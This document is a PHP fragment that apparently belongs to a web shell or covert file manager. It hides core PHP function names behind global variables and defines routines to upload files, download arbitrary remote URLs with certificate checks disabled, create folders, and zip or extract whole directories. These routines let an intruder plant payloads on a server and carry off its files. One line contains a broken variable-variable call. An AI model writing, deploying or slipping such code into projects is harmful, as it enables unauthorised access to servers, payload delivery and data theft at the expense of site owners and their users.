// Upload file form
function bupf($file)
{
  global $m_uf;
  global $b_sm;
  global $hsc;
  $upload_dir = __DIR__ . '/';
  if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0755, true);
  }
  $file_name = $b_sm($file['name']);
  $target_file = $upload_dir . $file_name;
  if ($m_uf($file['tmp_name'], $target_file)) {
    return "File uploaded successfully: " . $hsc($file_name);
  } else {
    return "Error uploading file.";
  }
}

// Remote upload from URL
function rfc($file_url, $custom_file_name)
{
  global $fp_ct;
  global $hsc;
  global $b_sm;
  $upload_dir = __DIR__ . '/';
  if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0755, true);
  }
  $file_name = !empty($custom_file_name) ? $hsc($custom_file_name) : $hsc($$b_sm($file_url));
  $target_file = $upload_dir . $file_name;
  $file_data = bcl($file_url, $file_name);
  if ($file_data === false) {
    return "Error: Could not download file from the provided URL.";
  }
  if ($fp_ct($target_file, $file_data)) {
    return "Remote file uploaded successfully as: " . $hsc($file_name);
  } else {
    return "Error saving remote file.";
  }
}

// Download file using cURL
function bcl($url, $filename)
{
  global $cl_i;
  $ch = $cl_i();
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
  $data = curl_exec($ch);
  curl_close($ch);
  return $data !== false ? $data : false;
}

// NewFolder
function bnfd($folder_name)
{
  global $hsc;
  $target_folder = __DIR__ . '/' . $folder_name;
  if (!mkdir($target_folder, 0755, true)) {
    return "Error creating folder: " . $hsc($folder_name);
  }
  return "Folder created successfully: " . $hsc($folder_name);
}

// Recursive
function ttw($folder, $zip, $base_folder)
{
  global $s_rlc;
  $dir_iterator = new RecursiveDirectoryIterator($folder, RecursiveDirectoryIterator::SKIP_DOTS);
  $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
  foreach ($iterator as $file) {
    $relative_path = $s_rlc($base_folder . '/', '', $file->getPathname());
    if ($file->isDir()) {
      $zip->addEmptyDir($relative_path);
    } else {
      $zip->addFile($file->getPathname(), $relative_path);
    }
  }
}

// ZipFile
function zpfl($source_folder, $zip_file_path)
{
  global $hsc;
  if (!is_dir($source_folder)) {
    return "<div style='color: red;'>Error: Source path is not a directory.</div>";
  }
  $zip = new ZipArchive();
  if ($zip->open($zip_file_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
    return "<div style='color: red;'>Error: Cannot create zip file at $zip_file_path</div>";
  }
  ttw($source_folder, $zip, $source_folder);
  $zip->close();
  return "<div style='color: green;'>ZIP file created successfully at: " . $hsc($zip_file_path) . "</div>";
}

function bzpf($zip_file_path, $destination_path)
{
  global $hsc;
  if (!file_exists($zip_file_path)) {
    return "<div style='color: red;'>Error: ZIP file not found.</div>";
  }
  $zip = new ZipArchive();
  if ($zip->open($zip_file_path) === TRUE) {
    if (!is_dir($destination_path)) {
      mkdir($destination_path, 0755, true);
    }
    if ($zip->extractTo($destination_path)) {
      return "<div style='color: green;'>Successfully extracted ZIP to: " . $hsc($destination_path) . "</div>";
    } else {
      return "<div style='color: red;'>Error: Failed to extract ZIP file.</div>";
    }
    $zip->close();
  } else {
    return "<div style='color: red;'>Error: Unable to open ZIP file.</div>";
  }
}
